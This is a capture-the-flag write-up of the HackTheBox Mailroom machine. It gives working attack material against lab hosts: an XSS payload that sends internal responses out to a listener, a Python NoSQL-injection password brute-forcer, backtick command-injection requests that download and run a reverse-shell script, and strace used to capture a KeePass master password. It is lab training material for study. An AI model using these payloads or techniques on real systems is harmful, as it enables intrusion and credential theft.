---
layout:     post
title:      "HackTheBox - Mailroom"
subtitle:   "Write-Up"
date:       2023-08-19
author:     "D4mianwayne"
tags:    ["BlindSQLInjection, NoSQL, XSS, pspy64"]
categories: ["HackTheBox"]
layout: "simple"

---



Writeup for HackTheBox's Mailroom machine.

<!-- more -->

Starting off with the `nmap` scan,  we can see that port 80 and 22 is open:

```jsx
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 82:1b:eb:75:8b:96:30:cf:94:6e:79:57:d9:dd:ec:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZd951iwnVNWvSYmYx8ZJUf9o5yhI3zVuVAfNLLrTdhwnstMMOWcnMDyPgwfnbzDJ89BnmvHuC5k9kVJjIQJpM=
|   256 19:fb:45:fe:b9:e4:27:5d:e5:bb:f3:54:97:dd:68:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImOwXljVycTwdL6fg/kkMWPDWdO+roydyEf8CeBYu7X
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: The Mail Room
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Performing a directory busting on the HTTP port, we see that it has multiple php files but none of them are of much interest beside `contact.php` 

```jsx
❯ gobuster dir -u http://10.10.11.209/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.209/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/20 09:31:15 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7748]
/contact.php          (Status: 200) [Size: 4317]
/about.php            (Status: 200) [Size: 6891]
/services.php         (Status: 200) [Size: 4336]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.209/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.209/css/]   
/template             (Status: 403) [Size: 277]                                  
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.209/js/]    
/javascript           (Status: 301) [Size: 317] [--> http://10.10.11.209/javascript/]
/font                 (Status: 301) [Size: 311] [--> http://10.10.11.209/font/]      
/server-status        (Status: 403) [Size: 277]                                      
                                                                                     
===============================================================
2023/04/20 10:27:58 Finished
===============================================================
```

The contact page accepts the a feedback message, we can try to include a XSS payload and see if it hit back to our HTTP Server:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled.png)

We got a hit on the HTTP Server:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_1.png)

Although nothing more could be done, as there was no login page or admin panel hence there is no need to manage sessions of an user due to which we cannot try to steal cookies either. Furthermore, performing a `vhost` scan, I identified that `git.mailroom.htb` exists, adding it to the `hosts` file and visiting it, we see that there is a repository named `staffroom` for a user named `matthew` , since the repository is public, we can have a look into the code:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_2.png)

Noticing that there is another application running on `staff-review-panel.mailroom.htb/` , accessing it directly from the browser or from my machine resulted in `403` Access Denied which probably means there’s some kind of filtering.

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_3.png)

Recalling that we had XSS through which we can trick the AI bot into visiting the provided link, what we can do with this, let the AI bot visit the `staff-review-panel.mailroom.htb/` and send it’s contents to our listener, this could be done with following XSS payload:

Now, sending the payload, we see that there is a response and it is able to access the `staff-review-panel.mailroom.htb` successfully

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_4.png)

Now, since we have access to the codebase of the `staff-review-panel.mailroom.htb` , we see that there is `auth.php` and it is authenticating user via `mongodb` 

The way the authentication works is, first the user provides email and password which is then checked from the collections, if it is correct a 2FA email is sent  to the user which contains the link that can be used to authenticate to the application:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_5.png)

There is a possibility of NoSQL injection, we can check it by sending the following payload:

```jsx
<script>
    var mail1req = new XMLHttpRequest();    
    mail1req.onreadystatechange = function() {{    
      if (mail1req.readyState == 4) {{    
        var exfilreq = new XMLHttpRequest();    
        exfilreq.open("POST", "http://10.10.14.22/", false);    
        exfilreq.send(mail1req.response);    
      }}    
    }};    
    mail1req.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', false);
    mail1req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var params = "email[$ne]=1&password[$ne]=1"; 
    mail1req.send(params);
</script>
```

This returned a successful response exactly but it sends a 2FA token.

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_6.png)

Since we do not have any way of reading mail, we can use this NoSQL injection to dump the credentials, Nikhil made the following payload script which was used to dump the `email` and `password` :

```python
import socket
import http.server
import socketserver
import threading
import requests

result = ""
final_payload = ""

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        global result
        
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)

        if "Check your inbox for an email with your 2FA token" in str(body):
            result = True

        self.send_response(200)
        self.end_headers()
        event.set()

def start_server():
    with socketserver.TCPServer(("", 80), MyRequestHandler) as httpd:
        print("Server listening on port 80...")
        httpd.serve_forever()

def send_request(payload):
    url = "http://10.10.11.209:80/contact.php"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}

    xss_payload = f"""
    <script>
    var mail1req = new XMLHttpRequest();    
    mail1req.onreadystatechange = function() {{    
      if (mail1req.readyState == 4) {{    
        var exfilreq = new XMLHttpRequest();    
        exfilreq.open("POST", "http://10.10.14.62/", false);    
        exfilreq.send(mail1req.response);    
      }}    
    }};    
    mail1req.open('POST', 'http://staff-review-panel.mailroom.htb/auth.php', false);
    mail1req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    # var params = "email[$regex]=^{payload}&password[$ne]=fakepass"; 
    var params = "email=tristan@mailroom.htb&password[$regex]=^{payload}"; 
    mail1req.send(params);
    </script>
    """
    data = {
    "email": "pwn@hack.com",
    "title": "Pwn",
    "message": xss_payload
    }
    requests.post(url, headers=headers, data=data)

# start the server in a separate thread
event = threading.Event()
server_thread = threading.Thread(target=start_server)
server_thread.start()

# send requests and wait for server to print the body before proceeding with the next request
special_chars = ['\\', '.', '^', '$', '*', '+', '?', '{', '}', '[', ']', '(', ')', '|', '&', '!', '.', '#', '/', '^']
i = 33
while i < 126:
    char = chr(i)
    if char in special_chars:
        char = '\\\\' + char
    print(f"Trying: {final_payload}" + chr(i))
    send_request(final_payload + char)
    if event.wait(timeout=60):
        event.clear()  # reset the event for the next iteration
        
        if result:
            print(f"Found: {chr(i)}")
            final_payload += chr(i)
            i = 32
            result = False
    else:
        print("Timeout waiting for server response")
        pass

    if i < 126:
        i += 1
```

Running it, we successfully were able to get the password and email, although it did break in-between a lot due to free tier network and the script was modified altogether in accordance to the pattern found:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_7.png)

```jsx
tristan:69trisRulez!
```

Now, we retrieved the credentials, trying to SSH into the machine as the user `tristan`

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_8.png)

After thorough enumeration, I did not find anything of concern beside the `/var/mail/tristan` which contained the 2FA code sent to it.

- Although one thing I noticed that there wasn’t any trace of applications running so far, to presume and checking the network interfaces, I came to the conclusion it might be running inside the docker.

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_9.png)

Going back to the `staff-review-panel.mailroom.htb` , since we have the credentials and we have 2FA token access. Now, we can do dynamic port forwarding to access the  [http://staff-review-panel.mailroom.htb/](http://staff-review-panel.mailroom.htb/) directly, now all we have to do is use the proxy and we are able to access it successfully:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_10.png)

Authenticating as the `tristan` user, a 2FA code was sent to him, which we can get from `/var/mail/tristan`

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_11.png)

```jsx
tristan@mailroom:~$ cat /var/mail/tristan
Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=ce9db17d910d46a089ebe2cd73915cd8
From noreply@mailroom.htb  Sat Apr 22 09:39:14 2023
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
	by mailroom.localdomain (Postfix) with SMTP id C26B4D4E
	for <tristan@mailroom.htb>; Sat, 22 Apr 2023 09:39:14 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=9bb740bafb69c15d88cdc7a090d65181
```

Visiting the link we got with the 2FA, we can successfully access the application now:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_12.png)

Recalling the `git.mailroom.htb` , we saw that there was a `inspect.php` and it had `shell_exec` function call which takes either `inquiry_id` or `status_id` and it filters out some characters to mitigate the possibility of command injection via `preg_replace` but it misses the backtick character

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_13.png)

We can test it by capturing the request in burp suite and making a `nc` connection, to point it out, the `staff-review-panel.mailroom.htb` is running inside the docker and it was unable to make connection to my kali machine, so I used the SSH connection to connect to the `mailroom.htb` machine and used it for gaining reverse shell and testing connection:

```jsx
POST /inspect.php HTTP/1.1
Host: staff-review-panel.mailroom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://staff-review-panel.mailroom.htb
Connection: close
Referer: http://staff-review-panel.mailroom.htb/inspect.php
Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58
Upgrade-Insecure-Requests: 1

inquiry_id=%60nc%2010%2E10%2E11%2E209%204444%60
```

It wasn’t connecting back to my kali machine but successfully making connection the mailroom machine itself, could be because of docker instance running on the machine it is unable to make any outbound connection beside the host machine itself

```jsx
tristan@mailroom:~$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.19.0.5 52694
```

Now, since there are many filtered characters, what I did was downloading the bash script containing the reverse shell payload to the `staff-review-panel.mailroom.htb` docker 

```jsx
`; curl http://10.10.11.209:4444/shell.sh -o /tmp/shell.sh`
```

```jsx
POST /inspect.php HTTP/1.1
Host: staff-review-panel.mailroom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://staff-review-panel.mailroom.htb
Connection: close
Referer: http://staff-review-panel.mailroom.htb/inspect.php
Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58
Upgrade-Insecure-Requests: 1

status_id=%60%3B%20curl%20http%3A%2F%2F10%2E10%2E11%2E209%3A4444%2Fshell%2Esh%20%2Do%20%2Ftmp%2Fshell%2Esh%60
```

It downloaded the `shel;l.sh` script from the HTTP Server

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_14.png)

Now, we just execute the bash script:

```jsx
POST /inspect.php HTTP/1.1
Host: staff-review-panel.mailroom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://staff-review-panel.mailroom.htb
Connection: close
Referer: http://staff-review-panel.mailroom.htb/inspect.php
Cookie: PHPSESSID=b650e6ee5cb719dd1287420443922d58
Upgrade-Insecure-Requests: 1

status_id=%60%3B%20bash%20%2Ftmp%2Fshell%2Esh%60
```

Doing so, we got the reverse shell on the `staff-review-panel.mailroom.htb` 

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_15.png)

Checking the docker filesystem, nothing much was found though the `/var/www/staffroom` had `.git` folder which had `config` file containing the credentials for the `matthew` user:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_16.png)

```jsx
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[user]
	email = matthew@mailroom.htb
```

I tried to SSH as `matthew` but it resulted in failure, so from the `tristan` session, we can just do `su` to change to `matthew`

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_17.png)

After further enumeration, what I identified was there was `Personal.kdbx` file but we did not have master key to access the database and performing the normal enumeration did not point to any potential location containing the key, running `pspy` did reveal that there was a command being executed every often and the process is being executed by `matthew` user itself:

![](/img/Mailroom_80349240b60d40f697ec5fe41f13d646/Untitled_18.png)

To check what the process was doing or what argument is passed to it, since we have `matthew` user privileges and the automated process is also ran under `matthew` , we can attach to the process and check the syscalls or inputs passed to it. To do so, we can make use of `strace` and use `-p` to specify the PID

```jsx
strace -p <PID>
```

Using the `strace` to attach to the automated process, I noticed following calls to `read` which was reading the master key password from the `stdin` 

```jsx
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
brk(0x5596e3641000)                     = 0x5596e3641000
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "!", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "s", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "E", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "c", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "U", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "r", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "3", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "p", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "4", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "$", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "$", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x5596e361ea20, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "w", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
